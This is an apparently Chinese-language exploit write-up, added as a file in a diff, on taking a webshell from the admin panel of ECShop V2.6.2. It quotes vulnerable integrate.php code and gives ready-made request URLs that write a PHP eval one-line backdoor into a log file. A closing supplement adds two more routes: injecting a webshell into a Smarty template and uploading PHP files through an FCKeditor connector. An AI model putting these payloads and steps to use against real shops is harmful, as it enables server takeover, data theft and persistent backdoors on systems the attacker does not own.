@@ -1,0 +1,103 @@
+ECShop网店系统V2.6.2 后台拿webshell
+
+
+法很实用，随便测试了几个都成功了，奇怪的是官方到现在为止还没有反应！鬼仔博客里“肉丝”在留言中写道“在“模板管理”-》“库项目管理”里面插入就可以了，不用那么麻烦的，还不受register_globals的拘束”，不过这种方法我没有测试。
+
+来源:oldjun
+
+ECSHOP是一款开源免费的网上商店系统。由专业的开发团队升级维护，为您提供及时高效的技术支持，您还可以根据自己的商务特征对ECSHOP进行定制，增加自己商城的特色功能。（官方介绍）
+
+ECSHOP前段时间出了个注射漏洞：http://bbs.wolvez.org/topic/67/，拿后台权限应该没有问题，但文章没有提及如何在后台拿shell。昨天可乐在t00ls.Net上发帖问如何拿shell，无聊中我baidu、 google了下，网上貌似没有拿shell的办法。好久没读代码了，无聊中下了ECSHOP最新版（V2.6.2）的源码过来读，很庆幸，给我找到一个可以直接写shell的文件。与注射一样，同样是个变化未初始化导致的问题，于是，同样只能用在register_globals为on的环境下。
+
+integrate.php第740行起：
+
+==============================================
+
+if ($_REQUEST['act'] == 'sync')
+{
+$size = 100;
+
+......
+
+$tasks = array();
+if ($task_del > 0)
+{
+$tasks[] = array('task_name'=>sprintf($_LANG['task_del'], $task_del),'task_status'=>'<span id="task_del">' . $_LANG['task_uncomplete'] . '<span>');
+$sql = "SELECT user_name FROM " . $ecs->table('users') . " WHERE flag = 2";
+$del_list = $db->getCol($sql);//$del_list未初始化
+
+}
+
+if ($task_rename > 0)
+{
+$tasks[] = array('task_name'=>sprintf($_LANG['task_rename'], $task_rename),'task_status'=>'<span id="task_rename">' . $_LANG['task_uncomplete'] . '</span>');
+$sql = "SELECT user_name, alias FROM " . $ecs->table('users') . " WHERE flag = 3";
+$rename_list = $db->getAll($sql);//$rename_list未初始化
+}
+
+if ($task_ignore >0)
+{
+$sql = "SELECT user_name FROM " . $ecs->table('users') . " WHERE flag = 4";
+$ignore_list = $db->getCol($sql);//$ignore_list未初始化
+}
+
+......
+
+/* 保存修改日志 */
+$fp = @fopen(ROOT_PATH . DATA_DIR . '/integrate_' . $_SESSION['code'] . '_log.php', 'wb');
+$log = '';
+if (isset($del_list))
+{
+$log .= '$del_list=' . var_export($del_list,true) . ';';
+}
+if (isset($rename_list))
+{
+$log .= '$rename_list=' . var_export($rename_list, true) . ';';
+}
+if (isset($ignore_list))
+{
+$log .= '$ignore_list=' . var_export($ignore_list, true) . ';';
+}
+//未做过滤，直接写log
+fwrite($fp, $log);
+fclose($fp);
+
+$smarty->assign('tasks', $tasks);
+$smarty->assign('ur_here',$_LANG['user_sync']);
+$smarty->assign('size', $size);
+$smarty->display('integrates_sync.htm');
+}
+
+==============================================
+
+$del_list、$rename_list、$ignore_list均没有初始化，于是，均可以直接写shell。利用方法:
+
+==============================================
+
+http://www.oldjun.com/admin/integrate.php?act=sync&del_list=<?php%20eval($_POST[cmd])?>
+http://www.oldjun.com/admin/integrate.php?act=sync&rename_list=<?php%20eval($_POST[cmd])?>
+http://www.oldjun.com/admin/integrate.php?act=sync&ignore_list=<?php%20eval($_POST[cmd])?>
+
+==============================================
+
+
+三个链接，随便输入一个就可以了，生成http://www.oldjun.com/data/integrate__log.php，就是一句话小马了。
+
+==============================================
+
+补充：
+
+ECShop安全问题：
+1、
+在“模板管理”-》“库项目管理”，
+然后选择myship.lbi，
+在模板里面随便插入一句话小马，
+在连接http://www.target.com/myship.php文件就可以了,
+ECshop的smarty模板机制是允许直接执行php代码的.
+直接使用“lanker一句话PHP后门客户端3.0内部版”
+
+2、
+\includes\fckeditor\editor\filemanager\connectors\php\config.php
+里面没定义 media文件类型，
+直接上传php文件就行了
+未登陆状态不能上传，只要登陆了后台，借助fckeditor就可以上传任意文件了
